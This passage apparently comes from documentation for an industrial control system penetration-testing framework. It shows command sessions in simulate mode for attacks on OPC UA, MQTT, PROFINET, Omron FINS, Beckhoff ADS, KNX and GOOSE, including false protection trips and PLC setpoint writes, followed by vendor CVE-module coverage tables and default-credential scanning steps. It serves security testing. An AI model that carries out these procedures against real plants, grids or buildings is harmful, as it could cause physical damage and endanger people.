          APPID:     0x0001
          APDU:      GOOSE PDU with stNum=1, sqNum=0, allData=[TRUE]
          Destination: 01:0c:cd:01:00:01 (GOOSE multicast MAC)
  Step 2: Send L2 frame via raw socket on eth0
  Step 3: All listening IEDs subscribed to this GoCB reference
          will interpret the GOOSE as a protection trip signal
  Step 4: Subscribed IEDs execute protection function (trip breaker)

  [i] Physical: False GOOSE trip causes protection relay to trip breaker
      immediately (<4ms). This is indistinguishable from a real protection event.
  [i] MITRE ATT&CK for ICS: T0855 (Unauthorized Command Message)
  [i] Remediation: Deploy IEC 62351-6 HMAC authentication on all GOOSE publishers
```

---

### 8. OPC UA

**Description:** OPC UA (OPC Unified Architecture) is the modern, cross-platform successor to OPC DA/DCOM. It runs over TCP port 4840 and optionally over HTTPS (4843). OPC UA supports multiple security modes: None (no security), Sign (signed messages), and SignAndEncrypt. Many deployments leave SecurityMode set to None for compatibility, allowing anonymous access to the entire tag namespace.

**Example Usage:**

```
ixf > use exploits/protocols/opcua/opcua_anonymous_write
[*] Module loaded: OPC UA Anonymous Write (SecurityMode=None)

ixf (OPC UA Anonymous Write) > set target 192.168.1.200
[*] target => 192.168.1.200

ixf (OPC UA Anonymous Write) > run

  [SIMULATE MODE — no packets sent]
  Module:  OPC UA Anonymous Write
  Target:  192.168.1.200:4840

  Step 1: Send OPC UA Hello message (HEL)
  Step 2: Send OPC UA OpenSecureChannel with SecurityMode=None
  Step 3: GetEndpoints — list all server endpoints including None-security
  Step 4: CreateSession with Anonymous identity token
  Step 5: Browse root namespace — list all nodes and tag names
  Step 6: Write to target node: NodeId ns=2;i=1003 (example: Tank Level Setpoint)
          WriteValue: Value=0.0 (drain setpoint)

  [i] MITRE ATT&CK for ICS: T0855 (Unauthorized Command Message), T0802
```

---

### 9. MQTT

**Description:** MQTT (Message Queuing Telemetry Transport) is widely used in IIoT for lightweight publish/subscribe messaging. Industrial IoT gateways, edge devices, and cloud connectors use MQTT brokers (Mosquitto, EMQX, HiveMQ) on port 1883 (plaintext) or 8883 (TLS). Many deployments run without authentication (`allow_anonymous true` in mosquitto.conf), exposing all topic data to any subscriber on the network.

**Example Usage:**

```
ixf > use exploits/protocols/mqtt/mqtt_anonymous_subscribe
[*] Module loaded: MQTT Anonymous Subscribe All Topics

ixf (MQTT Anonymous Subscribe All Topics) > set target 10.0.0.5
[*] target => 10.0.0.5

ixf (MQTT Anonymous Subscribe All Topics) > run

  [SIMULATE MODE — no packets sent]
  Step 1: Connect MQTT to 10.0.0.5:1883 with no credentials
  Step 2: Subscribe to wildcard topic '#' (all topics)
  Step 3: Collect all published messages:
          - Process values (temperature, pressure, flow)
          - Alarm states
          - Device configurations
          - Engineering data
  [i] In live mode: would expose all industrial telemetry to attacker
  [i] MITRE ATT&CK for ICS: T0802 (Automated Collection)
```

---

### 10. PROFINET DCP

**Description:** PROFINET DCP (Discovery and Configuration Protocol) is the Layer 2 protocol used by Siemens, Beckhoff, WAGO, and other PROFINET devices for automatic discovery and configuration. DCP runs over raw Ethernet (EtherType 0x8892) via broadcast. Malformed DCP Identify Requests can cause some devices to crash or reset (CVE-2019-13946).

**Example Usage:**

```
ixf > use exploits/protocols/profinet/profinet_dcp_flood
[*] Module loaded: PROFINET DCP Identify Flood

ixf (PROFINET DCP Identify Flood) > set interface eth0
[*] interface => eth0

ixf (PROFINET DCP Identify Flood) > run

  [SIMULATE MODE — no packets sent]
  Step 1: Craft PROFINET DCP Identify All request
          EtherType: 0x8892
          FrameID: 0xFEFE (DCP Identify All)
          ServiceID: 0x05 (Identify)
          ServiceType: 0x00 (Request)
  Step 2: Send broadcast to FF:FF:FF:FF:FF:FF
  Step 3: Collect all DCP Identify Response frames:
          - Name of Station (station name)
          - IP Address assigned
          - Device Vendor (from IANA)
          - Device Role (controller/device/supervisor)
          - Device Options (capabilities)
```

---

### 11. OPC DA (DCOM)

**Description:** OPC DA (Data Access) is the original Windows-based OPC standard, using Microsoft COM/DCOM for inter-process communication. It runs through the Windows RPC endpoint mapper (port 135) and dynamically assigned high ports. OPC DA servers are common in legacy Wonderware, Intellution (GE iFIX), and Kepware SCADA installations. DCOM configuration is notoriously complex and often left permissive.

**Example Usage:**

```
ixf > use exploits/protocols/opc_da/opc_da_tag_enum
[*] Module loaded: OPC DA Tag Enumeration via DCOM

ixf (OPC DA Tag Enumeration via DCOM) > set target 192.168.1.10
[*] target => 192.168.1.10

ixf (OPC DA Tag Enumeration via DCOM) > run

  [SIMULATE MODE — no packets sent]
  Step 1: Enumerate DCOM objects via RPC EndpointMapper (port 135)
  Step 2: Find OPC DA server ProgID: 'RSLinx.Application' or 'Kepware.KepServerEX.V6'
  Step 3: CreateInstance OPC Server object
  Step 4: IOPCServer::BrowseOPCItemIDs — enumerate all tag names and branches
  Step 5: IOPCServer::ValidateItems — validate accessible items
  Step 6: Report all tag names, data types, access rights
```

---

### 12. Omron FINS

**Description:** FINS (Factory Interface Network Service) is Omron's proprietary network protocol for CS/CJ/CP/NX/NJ series PLCs and CX-Programmer communication. FINS UDP runs on port 9600. FINS has no authentication — any host that can reach UDP/9600 can send FINS commands. The Memory Area Read command allows reading any PLC memory area (DM, I/O, HR, TIM, CNT, EM, EM extended).

**Example Usage:**

```
ixf > use exploits/protocols/fins/fins_memory_read
[*] Module loaded: Omron FINS Memory Area Read

ixf (Omron FINS Memory Area Read) > set target 192.168.1.150
[*] target => 192.168.1.150

ixf (Omron FINS Memory Area Read) > run

  [SIMULATE MODE — no packets sent]
  Step 1: Send FINS/UDP command (Memory Area Read):
          ICF: 80  RSV: 00  GCT: 02  DNA: 00  DA1: 00  DA2: 00
          SNA: 00  SA1: 08  SA2: 00
          MRC: 01  SRC: 01  (Memory Area Read command)
          Area: 82 (DM = Data Memory area)
          Addr: 00 00  Bit: 00  Count: 00 0A (10 words)
  Step 2: Receive FINS response with DM0-DM9 word values
  Step 3: Report PLC memory contents
  [i] DM area typically contains setpoints, counters, configuration data
```

---

### 13. Beckhoff ADS/AMS

**Description:** Beckhoff ADS (Automation Device Specification) / AMS (Automation Message Specification) is Beckhoff's proprietary protocol for TwinCAT PLC communication. ADS runs over TCP port 48898. With a valid AMS Net ID (typically matching the device IP), an attacker can read/write any PLC variable by name or index group, load/unload PLC programs, and stop/start the TwinCAT runtime.

**Example Usage:**

```
ixf > use exploits/protocols/ads/ads_variable_write
[*] Module loaded: Beckhoff ADS Variable Write

ixf (Beckhoff ADS Variable Write) > set target 192.168.1.80
[*] target => 192.168.1.80

ixf (Beckhoff ADS Variable Write) > run

  [SIMULATE MODE — no packets sent]
  Step 1: Connect TCP to 192.168.1.80:48898
  Step 2: Build AMS/TCP header: Net ID 192.168.1.80.1.1, Port 851 (PLC runtime)
  Step 3: ADS Write command: Index Group=0x4020 (data area), Index Offset=var_offset
  Step 4: Data: new variable value bytes
  Step 5: ADS Response: Error Code 0x0000 (success)
  [i] Impact: Arbitrary PLC variable write without authentication
```

---

### 14. Unitronics PCOM

**Description:** Unitronics PCOM is the proprietary protocol for Unitronics Vision and Unistream PLCs. Port 20256. PCOM allows full PLC memory read/write without authentication. Unitronics PLCs were famously attacked in the CISA/FBI 2023 advisory targeting water utility PLCs (Aliquippa Municipal Water Authority), where attackers accessed internet-exposed PLCs via default credentials and PCOM.

**Example Usage:**

```
ixf > use scanners/ics/pcom_scanner
[*] Module loaded: Unitronics PCOM Scanner

ixf (Unitronics PCOM Scanner) > set target 192.168.1.0/24
[*] target => 192.168.1.0/24

ixf (Unitronics PCOM Scanner) > run

  [SIMULATE MODE — no packets sent]
  Step 1: TCP connect to each host on port 20256
  Step 2: Send PCOM Info Request frame:
          /OPLC_UNIT_ID CC 00 00 00 00 00 00 00 00 00 00 00 00 00 00 \r
  Step 3: Parse response: model, OS version, application info, PLC ID
  Step 4: Report all Unitronics PLCs found with version info
  [i] Affected devices often include: Vision 700, Vision 1040, UniStream 7
```

---

### 15. KNX/EIB

**Description:** KNX/EIB is the dominant building automation protocol in Europe for residential and commercial buildings. KNXnet/IP (UDP 3671) allows control of lighting, blinds, heating, ventilation, and security systems from IP networks. Group address writes can directly control any KNX device on the bus without authentication.

**Example Usage:**

```
ixf > use exploits/protocols/knx/knx_group_write
[*] Module loaded: KNX Group Address Write

ixf (KNX Group Address Write) > set target 192.168.1.250
[*] target => 192.168.1.250

ixf (KNX Group Address Write) > set group_address "1/0/1"
[*] group_address => 1/0/1

ixf (KNX Group Address Write) > run

  [SIMULATE MODE — no packets sent]
  Step 1: Send KNXnet/IP Tunneling Request to 192.168.1.250:3671
  Step 2: CEMI L_DATA.REQ with:
          Priority: Normal
          Destination (group): 1/0/1 (typical: main lighting switch)
          APDU: GroupValueWrite (0x0080) data=0x01 (ON)
  Step 3: KNX bus devices subscribed to group 1/0/1 receive command
  Step 4: Lighting actuator activates
```

---

### 16. HART-IP

**Description:** HART (Highway Addressable Remote Transducer) is the most widely deployed field instrument protocol (>80 million devices). HART-IP (port 5094 TCP) carries HART commands over Ethernet for remote instrument access. HART devices expose: process variable, device identification, configuration parameters, and diagnostic information.

### 17. CANopen

**Description:** CANopen (CiA DS-301) is widely used in embedded machine control, robotics, and autonomous vehicles. IXF attacks CANopen via gateway TCP bridges. NMT (Network Management) commands can stop/reset any node on the CANopen network.

### 18. CC-Link IE Field

**Description:** CC-Link IE Field is Mitsubishi's high-speed Gigabit Ethernet fieldbus for MELSEC iQ-R, iQ-F, and Q/L series PLCs. Used throughout Asian manufacturing. The protocol has minimal authentication.

### 19. SECS/GEM (HSMS)

**Description:** SECS/GEM (SEMI Equipment Communications Standard / Generic Equipment Model) is the standard for semiconductor fab equipment communication. HSMS (High Speed Message Services) carries SECS over TCP port 5000. S1F1/S1F2 (Are You There / On-Line Data) leaks complete equipment identification including model, software revision, and supported streams/functions.

### 20. EtherCAT

**Description:** EtherCAT (Ethernet for Control Automation Technology) is Beckhoff's high-speed fieldbus for motion control (sub-microsecond cycle times). EtherCAT runs at Layer 2 (EtherType 0x88A4) and requires physical access to the network. An attacker on the EtherCAT segment can inject or corrupt frames.

---

## `vendors` Command — Full Output

```
ixf > vendors

  IXF Vendor Coverage — 150 Vendors
  ═══════════════════════════════════════════════════════════════════════════
  Vendor                               Region      CVE Modules
  ─────────────────────────────────────────────────────────────────────────
  schneider_electric                   EU/Global       39
  rockwell_automation                  Americas        38
  siemens                              EU/Global       27
  delta_electronics                    Asia            11
  omron                                Asia            12
  abb                                  EU/Global       22
  honeywell                            Americas        20
  ge_vernova                           Americas        18
  emerson                              Americas        16
  aveva_osisoft                        Americas        14
  advantech                            Asia            15
  inductive_automation                 Americas         5
  tridium                              Americas         5
  yokogawa                             Asia             5
  beckhoff                             EU               5
  phoenix_contact                      EU               6
  ge_multilin                          Americas         4
  weintek                              Asia             2
  delta_controls                       Americas         1
  fatek                                Asia             2
  mitsubishi_electric                  Asia             3
  fanuc                                Asia             2
  yaskawa                              Asia             2
  keyence                              Asia             2
  panasonic                            Asia             1
  fuji_electric                        Asia             2
  jtekt                                Asia             2
  hiwin                                Asia             1
  vigor                                Asia             1
  ls_electric                          Asia             1
  hollysys                             Asia             2
  supcon                               Asia             1
  inovance                             Asia             1
  invt                                 Asia             1
  chint                                Asia             1
  kinco                                Asia             1
  delixi                               Asia             1
  step_electric                        Asia             1
  wago                                 EU               2
  pilz                                 EU               1
  b_and_r_automation                   EU               2
  festo                                EU               1
  endress_hauser                       EU               2
  pepperl_fuchs                        EU               1
  sick_ag                              EU               2
  hms_networks                         EU               2
  belden_hirschmann                    EU               2
  westermo                             EU               1
  ruggedcom                            EU               2
  metso_valmet                         EU               1
  danfoss                              EU               1
  krohne                               EU               2
  lenze                                EU               1
  hilscher                             EU               1
  softing                              EU               2
  saia_burgess                         EU               1
  sauter_ag                            EU               1
  distech_controls                     EU               1
  sofrel                               EU               1
  aspentech                            Americas         1
  automation_direct                    Americas         1
  red_lion                             Americas         1
  opto22                               Americas         1
  prosoft_technology                   Americas         2
  bedrock_automation                   Americas         1
  moore_industries                     Americas         1
  sensata                              Americas         1
  s_and_c_electric                     Americas         1
  compressor_controls                  Americas         1
  flowserve                            Americas         1
  weatherford                          Americas         1
  sierra_wireless                      Americas         1
  automated_logic                      Americas         1
  kmc_controls                         Americas         1
  grundfos                             EU/Americas      2
  westinghouse                         Americas         1
  weg                                  Americas         2
  altus                                Americas         1
  novus                                Americas         1
  elipse_software                      Americas         2
  smar                                 Americas         1
  digicon                              Americas         1
  kongsberg                            EU               1
  schweitzer_engineering               Americas         4
  alstom_ge_power                      EU/Americas      2
  hitachi_energy                       EU/Asia          3
  landis_gyr                           EU               2
  itron                                Americas         2
  ptc_thingworx                        Americas         1
  cisco_industrial                     Americas         3
  teltonika                            EU               1
  framatome                            EU               1
  wabtec                               Americas         1
  thales                               EU               1
  ─────────────────────────────────────────────────────────────────────────
  Total: 150 vendors covered
  ═══════════════════════════════════════════════════════════════════════════

ixf > vendors europe
  Vendors — Europe (26 covered)
  ─────────────────────────────────────────────────────────────────────────
  Siemens            Germany      27 CVE modules
  Schneider Electric France       39 CVE modules
  ABB                Switzerland  22 CVE modules
  Beckhoff           Germany       5 CVE modules
  Phoenix Contact    Germany       6 CVE modules
  WAGO               Germany       2 CVE modules
  Pilz               Germany       1 CVE modules
  B&R Automation     Austria       2 CVE modules
  Festo              Germany       1 CVE modules
  Endress+Hauser     Switzerland   2 CVE modules
  Pepperl+Fuchs      Germany       1 CVE modules
  SICK AG            Germany       2 CVE modules
  HMS Networks       Sweden        2 CVE modules
  Belden/Hirschmann  Germany       2 CVE modules
  Westermo           Sweden        1 CVE modules
  Ruggedcom (Siemens)Germany       2 CVE modules
  Metso/Valmet       Finland       1 CVE modules
  Danfoss            Denmark       1 CVE modules
  Krohne             Germany       2 CVE modules
  Lenze              Germany       1 CVE modules
  Hilscher           Germany       1 CVE modules
  Softing            Germany       2 CVE modules
  Saia-Burgess       Switzerland   1 CVE modules
  Sauter AG          Switzerland   1 CVE modules
  Distech Controls   France        1 CVE modules
  Sofrel             France        1 CVE modules

ixf > vendors americas
  Vendors — Americas (31 covered)
  ─────────────────────────────────────────────────────────────────────────
  Rockwell Automation  USA          38 CVE modules
  Honeywell            USA          20 CVE modules
  Emerson              USA          16 CVE modules
  GE / GE Vernova      USA          18 CVE modules
  Inductive Automation USA           5 CVE modules
  Tridium              USA           5 CVE modules
  AVEVA / OSIsoft      USA          14 CVE modules
  AspenTech            USA           1 CVE modules
  AutomationDirect     USA           1 CVE modules
  Red Lion Controls    USA           1 CVE modules
  Opto 22              USA           1 CVE modules
  ProSoft Technology   USA           2 CVE modules
  Bedrock Automation   USA           1 CVE modules
  Moore Industries     USA           1 CVE modules
  Sensata              USA           1 CVE modules
  S&C Electric         USA           1 CVE modules
  Compressor Controls  USA           1 CVE modules
  Flowserve            USA           1 CVE modules
  Weatherford          USA           1 CVE modules
  Sierra Wireless      Canada        1 CVE modules
  Delta Controls       Canada        1 CVE modules
  Automated Logic      USA           1 CVE modules
  KMC Controls         USA           1 CVE modules
  Grundfos             Denmark/USA   2 CVE modules
  Westinghouse         USA           1 CVE modules
  WEG                  Brazil        2 CVE modules
  ALTUS                Brazil        1 CVE modules
  Novus                Brazil        1 CVE modules
  Elipse Software      Brazil        2 CVE modules
  Smar                 Brazil        1 CVE modules
  Digicon              Brazil        1 CVE modules

ixf > vendors asia
  Vendors — Asia-Pacific (24 covered)
  ─────────────────────────────────────────────────────────────────────────
  Yokogawa          Japan          5 CVE modules
  Omron             Japan         12 CVE modules
  Mitsubishi Elec.  Japan          3 CVE modules
  FANUC             Japan          2 CVE modules
  Yaskawa           Japan          2 CVE modules
  Keyence           Japan          2 CVE modules
  Panasonic         Japan          1 CVE modules
  Fuji Electric     Japan          2 CVE modules
  JTEKT             Japan          2 CVE modules
  HIWIN             Taiwan         1 CVE modules
  Weintek           Taiwan         2 CVE modules
  Delta Electronics Taiwan        11 CVE modules
  Fatek Automation  Taiwan         2 CVE modules
  Vigor             Taiwan         1 CVE modules
  LS Electric       Korea          1 CVE modules
  Hollysys          China          2 CVE modules
  Supcon            China          1 CVE modules
  Inovance          China          1 CVE modules
  INVT              China          1 CVE modules
  CHINT             China          1 CVE modules
  Kinco             China          1 CVE modules
  Delixi            China          1 CVE modules
  STEP Electric     China          1 CVE modules
  Kongsberg         Norway         1 CVE modules
```

---

## Vendor Coverage Tables — Complete Reference

### Europe

| Vendor | Country | Key Products | CVEs | IXF Modules |
|--------|---------|--------------|------|-------------|
| Siemens | Germany | S7-1200/1500/300/400, WinCC, PCS 7, SCALANCE X, Desigo CC, SINEMA | 27 | `cve/siemens/*` (27 modules) |
| Schneider Electric | France | Modicon M340/M580/Quantum, EcoStruxure, IGSS SCADA, ConneXium, APC | 39 | `cve/schneider/*` (39 modules) |
| ABB | Switzerland | System 800xA, AC500, Relion 670, RTU500, B&R Automation (acquired) | 22 | `cve/abb/*` (22 modules) |
| Beckhoff | Germany | TwinCAT 2/3, EtherCAT, CX2040, BK9000, ADS protocol | 5 | `cve/beckhoff/*` (5 modules) |
| Phoenix Contact | Germany | PLCnext Technology, WebVisit HMI, FL mGuard firewall, Radioline | 6 | `cve/phoenix_contact/*` (6 modules) |
| WAGO | Germany | PFC100, PFC200, 750 Series I/O, Cockpit web server | 2 | `cve/wago/*` (2 modules) |
| Pilz | Germany | PNOZmulti 2, PSS4000, PITreader, PMC Safety | 1 | `cve/pilz/*` (1 module) |
| B&R Automation | Austria | APROL DCS, X20 I/O, Automation PC 910, ctrlX Drive | 2 | `cve/b_and_r/*` (2 modules) |
| Festo | Germany | CPX-AP-I, AX axis controller, CECC PLC | 1 | `cve/festo/*` (1 module) |
| Endress+Hauser | Switzerland | Fieldgate FXA42, Memograph M RSG45, VEGAPULS web server | 2 | `cve/endress_hauser/*` (2 modules) |
| Pepperl+Fuchs | Germany | IO-Link Masters, VisuNet, WirelessHART adapters | 1 | `cve/pepperl_fuchs/*` (1 module) |
| SICK AG | Germany | S3000 safety scanner, Flexi Soft, Inspector I40x camera | 2 | `cve/sick_ag/*` (2 modules) |
| HMS Networks | Sweden | Anybus X-Gateway, eWON Flexy IoT router, Ewon Talk2M | 2 | `cve/hms_networks/*` (2 modules) |
| Belden / Hirschmann | Germany | Eagle One firewall, RSPE managed switches, BAT wireless | 2 | `cve/belden_hirschmann/*` (2 modules) |
| Westermo | Sweden | Lynx managed industrial switches, Wolverine DSL | 1 | `cve/westermo/*` (1 module) |
| Ruggedcom (Siemens) | Germany | ROS (Rugged OS), ROX II, RS910 switch, RSG2100 | 2 | `cve/ruggedcom/*` (2 modules) |
| Metso / Valmet | Finland | DNA DCS, neles ValvGuard, Mapex MES | 1 | `cve/metso/*` (1 module) |
| Danfoss | Denmark | VLT/VACON variable frequency drives, AK-SC255 SCADA | 1 | `cve/danfoss/*` (1 module) |
| Krohne | Germany | SUMMIT 8800 flow computers, Optiflux 5000 | 2 | `cve/krohne/*` (2 modules) |
| Lenze | Germany | i550 series drives, ECS servo, L-force Controller | 1 | `cve/lenze/*` (1 module) |
| Hilscher | Germany | netX90/netX100 SoC, cifX PC cards, NXTANALYZER | 1 | `cve/hilscher/*` (1 module) |
| Softing | Germany | DataFEED OPC Suite, edgeConnector, OT Security Box | 2 | `cve/softing/*` (2 modules) |
| Saia-Burgess | Switzerland | PCD Series PLC, SBC Vision HMI, Enerex energy meter | 1 | `cve/saia_burgess/*` (1 module) |
| Sauter AG | Switzerland | moduWeb Vision building control server | 1 | `cve/sauter/*` (1 module) |
| Distech Controls | France | ECLYPSE BACnet/IP controller, EC-Net 4 | 1 | `cve/distech/*` (1 module) |
| Sofrel | France | LS-4x water/wastewater RTU, SCADA-Pack Link | 1 | `cve/sofrel/*` (1 module) |

### Americas

| Vendor | Country | Key Products | CVEs | IXF Modules |
|--------|---------|--------------|------|-------------|
| Rockwell Automation | USA | ControlLogix 5580, CompactLogix 5380, FactoryTalk, Studio 5000 | 38 | `cve/rockwell/*` (38 modules) |
| Honeywell | USA | Experion PKS, Spyder BAS, Enraf 854 ATG, Safety Manager | 20 | `cve/honeywell/*` (20 modules) |
| Emerson | USA | DeltaV DCS, ROC800 RTU, Fisher FIELDVUE digital valve | 16 | `cve/emerson/*` (16 modules) |
| GE / GE Vernova | USA | CIMPLICITY, iFIX, GE Grid Solutions SCADA, UR protection relays | 18 | `cve/ge/*` (18 modules) |
| Inductive Automation | USA | Ignition SCADA platform, Tag Historian, WebDev | 5 | `cve/inductive_automation/*` (5 modules) |
| Tridium | USA | Niagara 4 Framework, AX Series, JACE-8000 controller | 5 | `cve/tridium/*` (5 modules) |
| AVEVA / OSIsoft | USA | AVEVA System Platform, OSIsoft PI Server, PI AF | 14 | `cve/aveva/*` (14 modules) |
| AspenTech | USA | Aspen InfoPlus.21 historian, Aspen HYSYS | 1 | `cve/aspentech/*` (1 module) |
| AutomationDirect | USA | CLICK Plus PLC, DirectLogix DL205/405, C-more HMI | 1 | `cve/automation_direct/*` (1 module) |
| Red Lion Controls | USA | Crimson 3.x HMI/SCADA, RAM 9000 RTU | 1 | `cve/red_lion/*` (1 module) |
| Opto 22 | USA | groov EPIC PR1, groov RIO EM22, groov View SCADA | 1 | `cve/opto22/*` (1 module) |
| ProSoft Technology | USA | RadioLinx ControlScape, ICX35 cellular gateway | 2 | `cve/prosoft/*` (2 modules) |
| Bedrock Automation | USA | Open Secure PLC, Bedrock Fusion controller | 1 | `cve/bedrock/*` (1 module) |
| Moore Industries | USA | SPC signal processor, NET concentrator | 1 | `cve/moore_industries/*` (1 module) |
| Sensata | USA | Beacon RTU, Dimensions wireless RTU | 1 | `cve/sensata/*` (1 module) |
| S&C Electric | USA | PureWave BESS, GeoScale switching | 1 | `cve/s_and_c/*` (1 module) |
| Compressor Controls | USA | TurboControl MkV turbine controller | 1 | `cve/compressor_controls/*` (1 module) |
| Flowserve | USA | PumpWorks 710 controller | 1 | `cve/flowserve/*` (1 module) |
| Weatherford | USA | CygNet SCADA oil & gas platform | 1 | `cve/weatherford/*` (1 module) |
| Sierra Wireless | Canada | AirLink RV55, AirLink MG90 industrial router | 1 | `cve/sierra_wireless/*` (1 module) |
| Delta Controls | Canada | ORCAview BAS controller, delta ENTELIWEB | 1 | `cve/delta_controls/*` (1 module) |
| Automated Logic | USA | WebCTRL BAS, ALC EIKON DDC controllers | 1 | `cve/automated_logic/*` (1 module) |
| KMC Controls | USA | Commander BACnet field controller | 1 | `cve/kmc_controls/*` (1 module) |
| Grundfos | Denmark/USA | CUE pump frequency converter, WebPump | 2 | `cve/grundfos/*` (2 modules) |
| Westinghouse | USA | Common Q Nuclear I&C system | 1 | `cve/westinghouse/*` (1 module) |
| WEG | Brazil | CFW-11 variable frequency drive, Motor Scan IIoT | 2 | `cve/weg/*` (2 modules) |
| ALTUS | Brazil | Duo PLC series, Next PLC, Prime HMI | 1 | `cve/altus/*` (1 module) |
| Novus | Brazil | digiRail NXT, LogBox 3G temperature controllers | 1 | `cve/novus/*` (1 module) |
| Elipse Software | Brazil | E3 SCADA, Epics, Elipse Power | 2 | `cve/elipse/*` (2 modules) |
| Smar | Brazil | ProcessView SCADA, LD303 transmitter | 1 | `cve/smar/*` (1 module) |
| Digicon | Brazil | RTU-1200 data concentrators, SCADA-Net | 1 | `cve/digicon/*` (1 module) |

### Asia-Pacific

| Vendor | Country | Key Products | CVEs | IXF Modules |
|--------|---------|--------------|------|-------------|
| Yokogawa | Japan | CENTUM VP DCS, FAST/TOOLS SCADA, STARDOM FCN/FCJ | 5 | `cve/yokogawa/*` (5 modules) |
| Omron | Japan | NX701/NX1P2 controller, CJ2M, CP2E, Sysmac Studio | 12 | `cve/omron/*` (12 modules) |
| Mitsubishi Electric | Japan | MELSEC iQ-R/Q/F series, GENESIS64 SCADA, MELSOFT | 3 | `cve/mitsubishi/*` (3 modules) |
| FANUC | Japan | 0i CNC controller, Robot controller R-30iB | 2 | `cve/fanuc/*` (2 modules) |
| Yaskawa | Japan | Sigma-7 servo, MP3300 machine controller | 2 | `cve/yaskawa/*` (2 modules) |
| Keyence | Japan | KV-8000/5500 PLC, VT5 HMI, SR-G series | 2 | `cve/keyence/*` (2 modules) |
| Panasonic | Japan | FP7 PLC, FPWIN GR programming | 1 | `cve/panasonic/*` (1 module) |
| Fuji Electric | Japan | MICREX-SX, Monitouch V9 HMI, Frenic VFD | 2 | `cve/fuji_electric/*` (2 modules) |
| JTEKT | Japan | TOYOPUC PLC (PC10G/PC3J), JTEKT EtherNet/IP | 2 | `cve/jtekt/*` (2 modules) |
| HIWIN | Taiwan | MC Series motion controller, E1 servo drive | 1 | `cve/hiwin/*` (1 module) |
| Weintek | Taiwan | cMT3092X HMI, EasyBuilder Pro, cMT-SVR | 2 | `cve/weintek/*` (2 modules) |
| Delta Electronics | Taiwan | DIAEnergie EMS, AS-series PLC, DVP-series, InfraSuite | 11 | `cve/delta_electronics/*` (11 modules) |
| Fatek Automation | Taiwan | FBS Series PLC, FBs-EFCOM Ethernet | 2 | `cve/fatek/*` (2 modules) |
| Vigor | Taiwan | VH Series PLC, VE-050W HMI | 1 | `cve/vigor/*` (1 module) |
| LS Electric | Korea | XGK/XGI/XGR Series PLC, XP-Builder, LS PLC Ethernet | 1 | `cve/ls_electric/*` (1 module) |
| Hollysys | China | MACS-S DCS, HolliField safety controller | 2 | `cve/hollysys/*` (2 modules) |
| Supcon | China | JX-300XP/webField DCS, T-Guard SIS | 1 | `cve/supcon/*` (1 module) |
| Inovance | China | AM600/AM400 PLC, IS5 servo | 1 | `cve/inovance/*` (1 module) |
| INVT | China | Goodrive GD350 VFD, CHV series | 1 | `cve/invt/*` (1 module) |
| CHINT | China | NTCP2.0 smart circuit breaker, CHINT EMS | 1 | `cve/chint/*` (1 module) |
| Kinco | China | K5 Series PLC, MT5000 HMI | 1 | `cve/kinco/*` (1 module) |
| Delixi | China | CDN Series PLC, CDS5 servo | 1 | `cve/delixi/*` (1 module) |
| STEP Electric | China | AC301E VFD, STEP SV-X2 servo | 1 | `cve/step_electric/*` (1 module) |

### Energy / Power Grid Specialized

| Vendor | Country | Key Products | CVEs | IXF Modules |
|--------|---------|--------------|------|-------------|
| Schweitzer Engineering (SEL) | USA | SEL-351 relay, SEL-5037/5056 software, SEL-651R | 4 | `cve/schweitzer/*` (4 modules) |
| Alstom / GE Power | EU/USA | P40 Agile protection relay, T60 transformer protection | 2 | `cve/alstom/*` (2 modules) |
| Hitachi Energy (ABB) | EU/Asia | RTU500, Relion 670/630 series, PCM600, MicroSCADA | 3 | `cve/hitachi_energy/*` (3 modules) |
| GE Multilin | Canada | 850F relay, D60 line differential, F60 feeder | 2 | `cve/ge_multilin/*` (2 modules) |
| Landis+Gyr | Switzerland | E360 smart meter, Gridstream RF network | 2 | `cve/landis_gyr/*` (2 modules) |
| Itron | USA | Riva C smart meter, OpenWay Riva, NetworkManager | 2 | `cve/itron/*` (2 modules) |
| Kongsberg | Norway | K-Pos dynamic positioning, K-Bridge navigation | 1 | `cve/kongsberg/*` (1 module) |

### Maritime / Rail / Nuclear Specialized

| Vendor | Category | Key Products | CVEs | IXF Modules |
|--------|----------|--------------|------|-------------|
| Wabtec | Railway | EVO locomotive SCADA, Locotrol distributed power | 1 | `cve/wabtec/*` (1 module) |
| Framatome | Nuclear | TELEPERM XP I&C, SIREN nuclear plant system | 1 | `cve/framatome/*` (1 module) |
| Westinghouse | Nuclear | Common Q platform, PRIME I&C | 1 | `cve/westinghouse/*` (1 module) |
| Thales | Critical infra | SCADA railway signaling, air traffic management | 1 | `cve/thales/*` (1 module) |

### ICS Networking / IIoT Platforms

| Vendor | Category | Key Products | CVEs | IXF Modules |
|--------|----------|--------------|------|-------------|
| Cisco Industrial | ICS Networking | IR809/IR829, IE3400, IE4000, Industrial Network Director | 3 | `cve/cisco_industrial/*` (3 modules) |
| PTC / ThingWorx | IIoT Platform | ThingWorx Industrial IoT, Kepware OPC Server | 1 | `cve/ptc/*` (1 module) |
| Teltonika | ICS Networking | RUT955/TRB500 industrial cellular router | 1 | `cve/teltonika/*` (1 module) |
| HMS Networks | ICS Networking | Anybus X-Gateway, eWON Flexy, Ewon Talk2M | 2 | `cve/hms_networks/*` (2 modules) |

---

## Adding Coverage for a New Vendor or Device

To test an uncovered vendor, use protocol-specific scanners and generic credential modules:

```
# Discover devices on OT subnet
ixf > use scanners/ics/modbus_scanner
ixf > set target 192.168.1.0/24
ixf > run

# Protocol-specific scan after discovery
ixf > use scanners/ics/s7_comm_scanner
ixf > set target 192.168.1.50
ixf > run

# Generic default credential test
ixf > use creds/generic/http_default
ixf > set target 192.168.1.50
ixf > set port 80
ixf > run

# SNMP community string test (covers many vendors)
ixf > use creds/generic/snmp_community
ixf > set target 192.168.1.50
ixf > run
```

---

## Protocol Security Summary Table

A consolidated security posture reference for all 50 protocols:

| Protocol | Auth | Encryption | Integrity | Risk if Exposed | IXF Attack Severity |
|----------|------|-----------|-----------|----------------|---------------------|
| Modbus TCP | None | None | None | CRITICAL | HIGH |
| Modbus RTU | None | None | None | CRITICAL | HIGH |
| Siemens S7comm | None | None | None | CRITICAL | HIGH |
| Siemens S7comm+ | TLS (hardcoded key) | TLS (broken) | TLS | CRITICAL | HIGH |
| EtherNet/IP (CIP) | Optional | Optional | Optional | CRITICAL | HIGH |
| PROFINET DCP | None | None | None | HIGH | HIGH |
| DNP3 (base) | None | None | None | CRITICAL | HIGH |
| DNP3 (SAv5) | HMAC | None | HMAC | MEDIUM | MEDIUM |
| BACnet/IP | None | None | None | HIGH | HIGH |
| BACnet/SC | TLS + cert | TLS | TLS | LOW | LOW |
| IEC 60870-5-104 | None | None | None | CRITICAL | HIGH |
| IEC 61850 MMS | Optional (TLS) | Optional | Optional | HIGH | HIGH |
